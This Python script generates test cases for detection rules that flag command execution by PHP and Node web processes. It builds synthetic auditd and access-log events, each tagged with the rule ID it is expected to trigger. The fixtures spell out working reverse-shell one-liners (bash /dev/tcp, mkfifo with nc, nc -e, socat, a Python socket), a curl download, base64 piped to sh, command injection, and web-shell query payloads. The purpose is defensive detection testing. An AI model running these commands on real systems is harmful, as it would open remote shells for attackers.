#!/usr/bin/env python3
"""Generate tests/cases.json: realistic auditd / access-log events plus the
rule ID each one must trigger.

auditd writes an argument as a quoted string only if it is printable with no
spaces or quotes; otherwise it writes it unquoted as uppercase hex. This
generator applies the same encoding, so the cases match what the agent ships.

Usage: python3 build_cases.py > cases.json
"""
import json

USERS = {"php": (33, "web_exec_php"), "node": (999, "web_exec_node")}
_serial = [2000]


def enc(arg):
    if all(0x21 <= ord(c) <= 0x7E and c != '"' for c in arg):
        return f'"{arg}"'
    return arg.encode().hex().upper()


def audit(runtime, exe, argv, ppid=812):
    uid, key = USERS[runtime]
    _serial[0] += 1
    msg = f"audit(1761310000.{_serial[0] % 1000:03d}:{_serial[0]})"
    comm = argv[0].rsplit("/", 1)[-1][:15]
    syscall = (
        f"type=SYSCALL msg={msg}: arch=c000003e syscall=59 success=yes exit=0 "
        f"a0=55d0c1e2a0 a1=55d0c1e2b8 a2=55d0c1e2d0 a3=0 items=2 ppid={ppid} "
        f"pid={_serial[0] + 3000} auid=4294967295 uid={uid} gid={uid} euid={uid} "
        f"suid={uid} fsuid={uid} egid={uid} sgid={uid} fsgid={uid} tty=(none) "
        f'ses=4294967295 comm="{comm}" exe="{exe}" subj=unconfined key="{key}"'
    )
    args = " ".join(f"a{i}={enc(a)}" for i, a in enumerate(argv))
    execve = f"type=EXECVE msg={msg}: argc={len(argv)} {args}"
    cwd = f'type=CWD msg={msg}: cwd="/var/www/html"'
    proctitle = f"type=PROCTITLE msg={msg}: proctitle={chr(0).join(argv).encode().hex().upper()}"
    return " ".join([syscall, execve, cwd, proctitle])


def access(request, status=200, ip="10.0.0.5"):
    return (
        f'{ip} - - [24/Oct/2026:14:00:00 +0000] "{request} HTTP/1.1" {status} 512 '
        f'"-" "Mozilla/5.0 (X11; Linux x86_64)"'
    )


SH = ["sh", "-c"]
CASES = [
    # name, expected rule id, log
    ("php: shell via system()", "100510",
     audit("php", "/usr/bin/dash", SH + ["ping -c 1 127.0.0.1"])),
    ("php: injected command in sh -c", "100510",
     audit("php", "/usr/bin/dash", SH + ["ping -c 1 127.0.0.1;id"])),
    ("php: id", "100520", audit("php", "/usr/bin/id", ["id"])),
    ("php: whoami", "100520", audit("php", "/usr/bin/whoami", ["whoami"])),
    ("php: curl download", "100521",
     audit("php", "/usr/bin/curl", ["curl", "-s", "http://10.0.0.5/x.sh", "-o", "/tmp/x.sh"])),
    ("php: bash /dev/tcp reverse shell (hex)", "100530",
     audit("php", "/usr/bin/dash", SH + ["bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"])),
    ("php: bash -i (plain)", "100530", audit("php", "/usr/bin/bash", ["bash", "-i"])),
    ("php: mkfifo reverse shell (hex)", "100530",
     audit("php", "/usr/bin/dash",
           SH + ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.5 4444 >/tmp/f"])),
    ("php: base64 piped to sh (hex)", "100541",
     audit("php", "/usr/bin/dash", SH + ["echo aWQ= | base64 -d | sh"])),
    ("php: base64 binary", "100540", audit("php", "/usr/bin/base64", ["base64", "-d"])),
    ("node: shell via child_process.exec", "100510",
     audit("node", "/usr/bin/dash", SH + ["nslookup example.com"])),
    ("node: uname -a", "100520", audit("node", "/usr/bin/uname", ["uname", "-a"])),
    ("node: nc -e", "100531",
     audit("node", "/usr/bin/nc.traditional", ["nc", "-e", "/bin/sh", "10.0.0.5", "4444"])),
    ("node: python one-liner", "100522",
     audit("node", "/usr/bin/python3.12",
           ["python3", "-c", "import socket,os;s=socket.socket();s.connect(('10.0.0.5',4444))"])),
    ("php: ps aux (stock 92604 overlap)", "100520", audit("php", "/usr/bin/ps", ["ps", "aux"])),
    ("node: lscpu (stock 92606 overlap)", "100520", audit("node", "/usr/bin/lscpu", ["lscpu"])),
    ("php: scp (stock 92603 overlap)", "100521",
     audit("php", "/usr/bin/scp", ["scp", "-t", "/tmp"])),
    ("non-web user: python (stock rule, not ours)", "92600",
     audit("php", "/usr/bin/python3.12", ["python3", "backup.py"]).replace('key="web_exec_php"', 'key=(null)')),
    ("node: socat exec", "100530",
     audit("node", "/usr/bin/socat", ["socat", "tcp:10.0.0.5:4444", "exec:/bin/sh"])),
    ("node: worker fork (baseline only)", "100501",
     audit("node", "/usr/bin/node", ["node", "/opt/nodeapp/worker.js"])),
    # False-positive guards: must NOT be classified as reverse shells
    ("fp: rsync -e ssh is not nc -e", "100510",
     audit("php", "/usr/bin/dash", SH + ["rsync -e ssh /a backup:/b"])),
    ("fp: ssh -i is not sh -i", "100510",
     audit("php", "/usr/bin/dash", SH + ["GIT_SSH_COMMAND='ssh -i /var/www/.ssh/id' git pull"])),
    # Web access logs
    ("web: system() payload", "100560",
     access("GET /index.php?page=system%28%27id%27%29")),
    ("web: /bin/sh in query", "100560",
     access("GET /api/ping?host=127.0.0.1%3B%2Fbin%2Fsh")),
    ("web: node child_process payload", "100560",
     access("GET /node/eval?q=require(%27child_process%27).execSync(%27id%27)")),
    ("web: php in uploads dir", "100561", access("GET /uploads/avatar.php")),
    ("web: php in uploads dir, 404 (no alert)", None, access("GET /uploads/avatar.php", 404)),
    ("web: cmd= parameter", "100562", access("GET /shell.php?cmd=ls")),
]

if __name__ == "__main__":
    print(json.dumps([{"name": n, "expect": e, "log": l} for n, e, l in CASES], indent=2))
